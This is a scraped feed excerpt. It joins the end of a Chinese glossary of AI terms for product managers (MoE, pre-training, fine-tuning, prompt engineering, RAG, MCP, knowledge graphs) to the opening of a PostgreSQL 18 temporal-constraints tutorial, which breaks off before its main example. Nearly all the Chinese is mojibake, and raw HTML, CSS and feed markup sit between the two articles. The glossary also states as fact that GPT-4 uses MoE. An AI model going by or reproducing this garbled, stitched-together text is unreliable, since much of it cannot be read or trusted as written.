<p>MOEçš„æ ¸å¿ƒä»·å€¼æ˜¯â€œå¹³è¡¡æ€§èƒ½ä¸æˆæœ¬â€:æ¯”å¦‚è¦è®©æ¨¡å‹åŒæ—¶æ”¯æŒâ€œä»£ç â€â€œæ–‡æ¡ˆâ€â€œæ•°æ®åˆ†æâ€å¤šç§ä»»åŠ¡ï¼Œè‹¥ç”¨å•ä¸€æ¨¡å‹éœ€è¶…å¤§å‚æ•°è§„æ¨¡(æˆæœ¬é«˜)ï¼Œè€ŒMOEåªéœ€è®©ä¸åŒä¸“å®¶å„å¸å…¶èŒï¼Œæ—¢èƒ½ä¿è¯ä»»åŠ¡ç²¾åº¦ï¼Œåˆèƒ½é™ä½è®¡ç®—èµ„æºæ¶ˆè€—ã€‚</p>
<p>ç›®å‰GPT-4ã€PaLM 2ç­‰æ¨¡å‹éƒ½é‡‡ç”¨äº†MOEæ¶æ„ï¼Œæ˜¯æœªæ¥å¤§æ¨¡å‹â€œè½»é‡åŒ–è½åœ°â€çš„é‡è¦æ–¹å‘ã€‚</p>
<p><strong>9ã€é¢„è®­ç»ƒ(Pre-training)</strong></p>
<p>é¢„è®­ç»ƒæ˜¯å¤§æ¨¡å‹çš„â€œåŸºç¡€å­¦ä¹ é˜¶æ®µâ€:åœ¨è¿™ä¸ªé˜¶æ®µï¼Œæ¨¡å‹ä¼šåœ¨æµ·é‡æ— æ ‡æ³¨æ•°æ®(å¦‚å…¨ç½‘å…¬å¼€çš„æ–‡æœ¬ã€ä¹¦ç±ã€ä»£ç )ä¸Šè¿›è¡Œè®­ç»ƒï¼Œç›®æ ‡æ˜¯å­¦ä¹ â€œé€šç”¨çŸ¥è¯†å’Œè¯­è¨€è§„å¾‹â€--å°±åƒå­¦ç”Ÿåœ¨å­¦æ ¡å­¦ä¹ â€œè¯­æ–‡ã€æ•°å­¦ã€è‹±è¯­â€ç­‰åŸºç¡€å­¦ç§‘ï¼Œä¸é’ˆå¯¹æŸä¸€ç‰¹å®šèŒä¸šï¼Œè€Œæ˜¯æ„å»ºå¹¿åšçš„çŸ¥è¯†åŸºç¡€ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/adfc5dfac17544a7b8843f91f8f21d60~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=71Izauv0F4RNjsstfrQVnlTE%2BuQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>é¢„è®­ç»ƒçš„æ ¸å¿ƒç‰¹ç‚¹æ˜¯â€œæ— ç›‘ç£/å¼±ç›‘ç£â€(æ— éœ€äººå·¥æ ‡æ³¨æ•°æ®ç±»åˆ«)ï¼Œè®­ç»ƒå‘¨æœŸé•¿ã€èµ„æºæ¶ˆè€—å¤§(é€šå¸¸éœ€è¦æ•°åƒå¼ GPUå¡è¿è¡Œæ•°å‘¨)ï¼Œä½†èƒ½ä¸ºæ¨¡å‹æ‰“ä¸‹â€œé€šç”¨èƒ½åŠ›â€åŸºç¡€ã€‚</p>
<p>ç›®å‰å¸‚é¢ä¸Šçš„å¼€æºå¤§æ¨¡å‹(å¦‚LLaMA3ã€Qwen)å¤§å¤šæä¾›â€œé¢„è®­ç»ƒæƒé‡â€ï¼Œä¼ä¸šå¯åŸºäºæ­¤è¿›è¡Œåç»­ä¼˜åŒ–ï¼Œå¤§å¹…é™ä½ç ”å‘æˆæœ¬ã€‚</p>
<p><strong>10ã€å¾®è°ƒ(Fine-tuning)</strong></p>
<p>å¾®è°ƒæ˜¯åœ¨â€œé¢„è®­ç»ƒåŸºç¡€ä¸Šçš„å®šå‘ä¼˜åŒ–â€: é€šè¿‡ç»™é¢„è®­ç»ƒæ¨¡å‹è¾“å…¥â€œç‰¹å®šé¢†åŸŸçš„æœ‰æ ‡æ³¨æ•°æ®â€(å¦‚åŒ»ç–—é¢†åŸŸçš„ç—…å†ã€æ³•å¾‹é¢†åŸŸçš„æ³•æ¡)ï¼Œè®©æ¨¡å‹ä¸“æ³¨å­¦ä¹ æŸä¸€é¢†åŸŸçš„çŸ¥è¯†å’Œä»»åŠ¡é€»è¾‘-ä¸€å°±åƒå­¦ç”Ÿåœ¨å¤§å­¦é€‰æ‹©â€œåŒ»å­¦ä¸“ä¸šâ€ï¼Œé€šè¿‡é’ˆå¯¹æ€§å­¦ä¹ æˆä¸ºåŒ»ç–—é¢†åŸŸçš„ä¸“å®¶ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/170af3b1ff79496a81bd505c513ba7e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=fkhcADi2rofID8RE2hP%2Bxpr8F%2BQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¾®è°ƒåˆ†ä¸ºâ€œå…¨å‚æ•°å¾®è°ƒâ€(è°ƒæ•´æ¨¡å‹æ‰€æœ‰å‚æ•°ï¼Œæ•ˆæœå¥½ä½†æˆæœ¬é«˜)å’Œâ€œé«˜æ•ˆå¾®è°ƒâ€(å¦‚LORAã€OLORAï¼Œä»…è°ƒæ•´éƒ¨åˆ†å‚æ•°ï¼Œæˆæœ¬ä½ã€é€Ÿåº¦å¿«)ã€‚</p>
<p>å¯¹äº§å“ç»ç†è€Œè¨€ï¼Œå¾®è°ƒæ˜¯å®ç°â€œAIäº§å“é¢†åŸŸåŒ–â€çš„å…³é”®:æ¯”å¦‚è¦åšä¸€æ¬¾â€œæ³•å¾‹AIåŠ©æ‰‹â€ï¼Œå°±éœ€ç”¨æ³•å¾‹æ–‡ä¹¦æ•°æ®å¾®è°ƒé€šç”¨å¤§æ¨¡å‹ï¼Œè®©å…¶èƒ½ç²¾å‡†ç†è§£æ³•å¾‹æœ¯è¯­ã€ç”Ÿæˆåˆè§„æ–‡ä¹¦ã€‚</p>
<p><strong>11ã€æç¤ºå·¥ç¨‹(Prompt Engineering)</strong></p>
<p>æç¤ºå·¥ç¨‹æ˜¯â€œé€šè¿‡ä¼˜åŒ–è¾“å…¥ç»™æ¨¡å‹çš„'æç¤ºè¯â€™ï¼Œè®©æ¨¡å‹ç”Ÿæˆæ›´ç¬¦åˆéœ€æ±‚çš„è¾“å‡ºâ€çš„æŠ€æœ¯--ç®€å•æ¥è¯´ï¼Œå°±æ˜¯â€œç”¨æ›´ç²¾å‡†çš„è¯­è¨€'æŒ‡æŒ¥â€™AIå¹²æ´»â€ã€‚</p>
<p>æ¯”å¦‚æƒ³è®©AIå†™ä¸€ç¯‡â€œæ‰‹æœºæµ‹è¯„æ–‡æ¡ˆâ€ï¼Œè‹¥åªè¯´â€œå†™ä¸€ç¯‡æ‰‹æœºæµ‹è¯„â€ï¼Œè¾“å‡ºå¯èƒ½æ‚ä¹±æ— ç« ;ä½†å¦‚æœæç¤ºâ€œä»¥'å¹´è½»äººæ€§ä»·æ¯”ä¹‹é€‰â€™ä¸ºä¸»é¢˜ï¼Œä»æ€§èƒ½ã€ç»­èˆªã€å¤–è§‚ä¸‰ä¸ªç»´åº¦å†™æ‰‹æœºæµ‹è¯„ï¼Œæ¯éƒ¨åˆ†100å­—å·¦å³ï¼Œè¯­è¨€æ´»æ³¼â€ï¼Œè¾“å‡ºä¼šæ›´ç²¾å‡†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f6fe2a6e7a0403685e9a16cbd5775be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=AhFJnk9IHwDkJbcrovi9F7MfyHI%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æç¤ºå·¥ç¨‹çš„æ ¸å¿ƒæŠ€å·§åŒ…æ‹¬:æ˜ç¡®ä»»åŠ¡ç›®æ ‡ã€æä¾›ä¸Šä¸‹æ–‡ä¿¡æ¯ã€è®¾å®šè¾“å‡ºæ ¼å¼ã€åŠ å…¥ç¤ºä¾‹(å°‘æ ·æœ¬æç¤º)ã€‚</p>
<p>å¯¹äº§å“ç»ç†è€Œè¨€ï¼Œä¼˜ç§€çš„æç¤ºå·¥ç¨‹èƒ½â€œåœ¨ä¸ä¿®æ”¹æ¨¡å‹çš„æƒ…å†µä¸‹æå‡äº§å“æ•ˆæœâ€--æ¯”å¦‚æ™ºèƒ½å®¢æœäº§å“ï¼Œé€šè¿‡ä¼˜åŒ–ç”¨æˆ·é—®é¢˜çš„â€œæç¤ºè¯æ¨¡æ¿â€ï¼Œèƒ½è®©AIæ›´å¿«é€Ÿåœ°å®šä½ç”¨æˆ·é—®é¢˜ï¼Œå‡å°‘æ— æ•ˆå›å¤ã€‚</p>
<p><strong>12ã€RAG(æ£€ç´¢å¢å¼ºç”Ÿæˆ)</strong></p>
<p>RAG(Retrieval-Augmented Generationï¼Œæ£€ç´¢å¢å¼ºç”Ÿæˆ)æ˜¯ä¸€ç§â€œè®©AI'å…ˆæŸ¥èµ„æ–™å†å›ç­”â€™â€çš„æŠ€æœ¯: å®ƒçš„å·¥ä½œæµç¨‹åˆ†ä¸ºä¸‰æ­¥ï¼š</p>
<p>â‘  ç”¨æˆ·æå‡ºé—®é¢˜åï¼Œç³»ç»Ÿå…ˆä»â€œå¤–éƒ¨çŸ¥è¯†åº“â€(å¦‚æ–‡æ¡£åº“ã€æ•°æ®åº“ã€ç½‘é¡µ)ä¸­æ£€ç´¢ä¸é—®é¢˜ç›¸å…³çš„ä¿¡æ¯;</p>
<p>â‘¡å°†æ£€ç´¢åˆ°çš„ä¿¡æ¯ä¸ç”¨æˆ·é—®é¢˜æ•´åˆä¸ºâ€œä¸Šä¸‹æ–‡+æç¤ºè¯â€;</p>
<p>â‘¢ è®©å¤§æ¨¡å‹åŸºäºè¿™äº›ä¿¡æ¯ç”Ÿæˆå›ç­”ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/42c7250beb2f4e10b1b7d78dab75fb80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=NTrBVbzxdlXj%2BkLrc5gIPJWdYZE%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>RAGçš„æ ¸å¿ƒä¼˜åŠ¿æ˜¯â€œæå‡å›ç­”çš„å‡†ç¡®æ€§å’Œå¯æº¯æºæ€§â€:æ¯”å¦‚ä¼ ç»Ÿå¤§æ¨¡å‹å›ç­”â€œæŸå…¬å¸2024å¹´è¥æ”¶â€æ—¶ï¼Œå¯èƒ½å› çŸ¥è¯†è¿‡æ—¶ç”Ÿæˆé”™è¯¯æ•°æ®ï¼Œè€ŒRAGä¼šå…ˆæ£€ç´¢è¯¥å…¬å¸2024å¹´çš„è´¢æŠ¥ï¼Œå†åŸºäºè´¢æŠ¥å†…å®¹ç”Ÿæˆå‡†ç¡®å›ç­”ï¼Œä¸”èƒ½æ ‡æ³¨æ•°æ®æ¥æºã€‚</p>
<p>ç›®å‰RAGå·²å¹¿æ³›åº”ç”¨äºâ€œä¼ä¸šçŸ¥è¯†åº“é—®ç­”â€â€œæ³•å¾‹æ–‡ä¹¦ç”Ÿæˆâ€â€œå­¦æœ¯è®ºæ–‡è¾…åŠ©å†™ä½œâ€ç­‰åœºæ™¯ã€‚</p>
<p><strong>13ã€MCP</strong>(æ¨¡å‹ä¸Šä¸‹æ–‡åè®®)</p>
<p>MCP(ModelContextProtocolï¼Œæ¨¡å‹ä¸Šä¸‹æ–‡åè®®)æ˜¯Anthropicåœ¨2024å¹´11æœˆæ¨å‡ºçš„â€œå¼€æ”¾æ ‡å‡†â€ï¼Œæ ¸å¿ƒä½œç”¨æ˜¯â€œç»Ÿä¸€å¤§æ¨¡å‹ä¸å¤–éƒ¨å·¥å…·ã€æ•°æ®æºçš„'é€šä¿¡è¯­è¨€â€™â€ã€‚</p>
<p>åœ¨æ­¤ä¹‹å‰ï¼Œä¸åŒå·¥å…·(å¦‚æ•°æ®åº“ã€APIã€ç¬¬ä¸‰æ–¹æœåŠ¡)ä¸å¤§æ¨¡å‹çš„äº¤äº’æ–¹å¼å„ä¸ç›¸åŒï¼Œå¼€å‘äººå‘˜éœ€è¦ä¸ºæ¯ä¸ªå·¥å…·å•ç‹¬å†™é€‚é…ä»£ç ã€‚</p>
<p>è€ŒMCPé€šè¿‡å®šä¹‰ç»Ÿä¸€çš„â€œä¸Šä¸‹æ–‡æ ¼å¼â€å’Œâ€œäº¤äº’è§„åˆ™â€ï¼Œè®©å¤§æ¨¡å‹èƒ½åƒâ€œç”¨åŒä¸€é—¨è¯­è¨€å’Œä¸åŒäººå¯¹è¯ä¸€æ ·ï¼Œæ— ç¼å¯¹æ¥æ•°åƒç§å¤–éƒ¨å·¥å…·ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b6a6e46575bf477ea0c04a9ad8bb790b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=dTk2bZd8Ek4jaKtZbPn%2FZIpO2Cw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>MCPå¯¹äº§å“ç»ç†çš„ä»·å€¼åœ¨äºâ€œåŠ é€ŸAIäº§å“çš„'å·¥å…·é›†æˆâ€™èƒ½åŠ›â€: æ¯”å¦‚æƒ³åšä¸€æ¬¾â€œAIåŠå…¬åŠ©æ‰‹â€ï¼Œéœ€è¦é›†æˆâ€œæ–‡æ¡£å¤„ç†ã€æ—¥ç¨‹ç®¡ç†ã€é‚®ä»¶å‘é€â€ç­‰å·¥å…·ï¼ŒåŸºäºMCPæ ‡å‡†ï¼Œæ— éœ€é‡å¤å¼€å‘é€‚é…é€»è¾‘ï¼Œèƒ½å¿«é€Ÿå®ç°å·¥å…·å¯¹æ¥ï¼Œç¼©çŸ­äº§å“ä¸Šçº¿å‘¨æœŸã€‚</p>
<p>æœªæ¥MCPæœ‰æœ›æˆä¸ºè¡Œä¸šé€šç”¨æ ‡å‡†ï¼Œè¿›ä¸€æ­¥é™ä½AIäº§å“çš„å¼€å‘é—¨æ§›ã€‚</p>
<p><strong>14ã€çŸ¥è¯†å›¾è°±(Knowledge Graph)</strong></p>
<p>çŸ¥è¯†å›¾è°±æ˜¯â€œç”¨å›¾å½¢åŒ–æ–¹å¼è¡¨ç¤ºå®ä½“ã€å…³ç³»å’Œå±æ€§çš„ç»“æ„åŒ–çŸ¥è¯†åº“â€--å®ƒä¸åƒä¼ ç»Ÿæ•°æ®åº“é‚£æ ·â€œæœºæ¢°å­˜å‚¨æ•°æ®â€ï¼Œè€Œæ˜¯å°†çŸ¥è¯†ç»„ç»‡æˆâ€œèŠ‚ç‚¹(å®ä½“ï¼Œå¦‚'è‹¹æœâ€™'ä¹”å¸ƒæ–¯â€™)+è¾¹(å…³ç³»ï¼Œå¦‚'ä¹”å¸ƒæ–¯åˆ›ç«‹äº†è‹¹æœâ€™)â€çš„ç½‘ç»œï¼Œè®©è®¡ç®—æœºèƒ½æ¸…æ™°ç†è§£â€œäº‹ç‰©ä¹‹é—´çš„å…³è”â€</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec2f13b3260441b3ac330c80166eda47~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=jinsXzLFbIoOUgX%2FJVYOHb%2BSj8M%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>çŸ¥è¯†å›¾è°±åœ¨AIäº§å“ä¸­çš„åº”ç”¨éå¸¸å¹¿æ³›:æ¯”å¦‚åœ¨â€œæ™ºèƒ½æœç´¢â€ä¸­ï¼ŒçŸ¥è¯†å›¾è°±èƒ½å¸®ç”¨æˆ·å¿«é€Ÿè·å–â€œå…³è”ä¿¡æ¯â€(å¦‚æœç´¢â€œåŒ—äº¬â€æ—¶ï¼Œä¸ä»…æ˜¾ç¤ºåŒ—äº¬çš„åŸºæœ¬ä¿¡æ¯ï¼Œè¿˜ä¼šå…³è”â€œæ•…å®«â€â€œé•¿åŸâ€ç­‰æ™¯ç‚¹)ã€‚</p>
<p>åœ¨â€œé‡‘èé£æ§â€ä¸­ï¼ŒçŸ¥è¯†å›¾è°±èƒ½é€šè¿‡åˆ†æâ€œä¼ä¸š-æ³•äºº-å…³è”å…¬å¸â€çš„å…³ç³»ç½‘ç»œï¼Œè¯†åˆ«æ½œåœ¨çš„æ¬ºè¯ˆé£é™©ã€‚</p>
<p>å¯¹äº§å“ç»ç†è€Œè¨€ï¼ŒçŸ¥è¯†å›¾è°±æ˜¯æå‡A1â€œé€»è¾‘æ¨ç†èƒ½åŠ›â€å’Œâ€œä¿¡æ¯ç»„ç»‡èƒ½åŠ›â€çš„å…³é”®æŠ€æœ¯ï¼Œå°¤å…¶é€‚åˆéœ€è¦â€œæ·±åº¦å…³è”åˆ†æâ€çš„åœºæ™¯ã€‚</p>
<p>æ›´å¤šAIå¤§æ¨¡å‹å­¦ä¹ è§†é¢‘åŠèµ„æºï¼Œéƒ½åœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fyuan.zhipoai.cn%2F" target="_blank" title="https://yuan.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[PostgreSQL 18 - æ—¶é—´çº¦æŸ (Temporal Constraints)]]></title>    <link>https://juejin.cn/post/7577042851080142891</link>    <guid>https://juejin.cn/post/7577042851080142891</guid>    <pubDate>2025-11-27T07:36:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577042851080142891" data-draft-id="7576955345379393599" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="PostgreSQL 18 - æ—¶é—´çº¦æŸ (Temporal Constraints)"/> <meta itemprop="keywords" content="PostgreSQL,æ•°æ®åº“,å¼€æº"/> <meta itemprop="datePublished" content="2025-11-27T07:36:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IvorySQL"/> <meta itemprop="url" content="https://juejin.cn/user/761327331579511"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            PostgreSQL 18 - æ—¶é—´çº¦æŸ (Temporal Constraints)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/761327331579511/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IvorySQL
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:36:00.000Z" title="Thu Nov 27 2025 07:36:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>PostgreSQL 18 å¼•å…¥äº†ä¸€é¡¹å¼ºå¤§çš„æ–°åŠŸèƒ½ï¼Œå…è®¸ä½ åœ¨æ—¶é—´æ®µå†…å¼ºåˆ¶æ‰§è¡Œå”¯ä¸€æ€§ï¼š<strong>æ—¶é—´çº¦æŸï¼ˆTemporal Constraintsï¼‰</strong>ã€‚é€šè¿‡è¿™ä¸€æ–°å¢åŠŸèƒ½ï¼Œä½ ç°åœ¨å¯ä»¥åœ¨å®šä¹‰ <code>UNIQUE</code>ã€<code>PRIMARY KEY</code> æˆ– <code>FOREIGN KEY</code> çº¦æŸæ—¶ï¼Œåˆ©ç”¨æ—¥æœŸèŒƒå›´ï¼ˆDate Rangeï¼‰æˆ–æ—¶é—´æˆ³èŒƒå›´ï¼ˆTimestamp Rangeï¼‰å­—æ®µï¼Œæ¯”ä»¥å¾€æ›´å®¹æ˜“åœ°é˜²æ­¢æ•°æ®é‡å ã€‚</p>
<h2 data-id="heading-0">é—®é¢˜æ‰€åœ¨ï¼šåŸºäºæ—¶é—´çš„å”¯ä¸€æ€§</h2>
<p>åœ¨æœ€æ–°çš„è¿™ä¸ªç‰ˆæœ¬ä¸­ï¼ŒPostgreSQL å¢åŠ äº†ä¸€ç§æ›´çµæ´»çš„æ–¹å¼æ¥å®šä¹‰ <code>UNIQUE</code>ã€<code>PRIMARY KEY</code> å’Œ <code>FOREIGN KEY</code> çº¦æŸã€‚æˆ‘å°†æŠŠç¤ºä¾‹é‡ç‚¹æ”¾åœ¨ <code>UNIQUE</code> çº¦æŸä¸Šï¼Œå› ä¸ºè¿™åœ¨æˆ‘çœ‹æ¥æ˜¯æ—¶é—´çº¦æŸæœ€æœ‰ç”¨çš„åœºæ™¯ã€‚</p>
<p>è®©æˆ‘ä»¬ä»ä¸€ä¸ªç°å®ä¸–ç•Œçš„åœºæ™¯å¼€å§‹ï¼šç®¡ç†ç”¨æˆ·è®¢é˜…ã€‚</p>
<h3 data-id="heading-1">è®¾ç½®ç¤ºä¾‹</h3>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªç®€å•çš„ <code>users</code> è¡¨ï¼ŒåŒ…å« 2 è¡Œæ•°æ®ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> users (
  id uuid <span class="hljs-keyword">DEFAULT</span> uuidv7() <span class="hljs-keyword">PRIMARY</span> KEY,
  email <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">UNIQUE</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>
);

<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users (email) <span class="hljs-keyword">VALUES</span> 
(<span class="hljs-string">'darth@example.com'</span>),
(<span class="hljs-string">'luke@example.com'</span>);
</code></pre>
<h3 data-id="heading-2">ä½¿ç”¨ WITHOUT OVERLAPS çš„æ—¶é—´çº¦æŸ</h3>
<p>ç°åœ¨æˆ‘æƒ³åˆ›å»ºä¸€ä¸ªå±äº <code>users</code> è¡¨çš„ <code>subscriptions</code>ï¼ˆè®¢é˜…ï¼‰è¡¨ã€‚æ¯ä¸ªè®¢é˜…éƒ½æœ‰å¼€å§‹å’Œç»“æŸæ—¥æœŸï¼Œæˆ‘æƒ³ç¡®ä¿æ¯ä¸ªç”¨æˆ·çš„è®¢é˜…æ˜¯å”¯ä¸€çš„ã€‚ç”¨æˆ·å¯ä»¥æœ‰è¿‡å»çš„è®¢é˜…ï¼ˆä¹Ÿè®¸ä»–ä»¬å‡çº§äº†å±‚çº§ï¼‰ï¼Œä½†åœ¨ä»»ä½•ç»™å®šçš„æ—¶é—´ç‚¹åªèƒ½æœ‰ä¸€ä¸ªæ´»è·ƒçš„è®¢é˜…ã€‚</p>
<p>ä»¥ä¸‹æ˜¯æˆ‘ä»¬å¦‚ä½•ä½¿ç”¨æ–°çš„ <code>WITHOUT OVERLAPS</code> è¯­æ³•æ¥å¼ºåˆ¶æ‰§è¡Œæ­¤æ“ä½œï¼š</p>
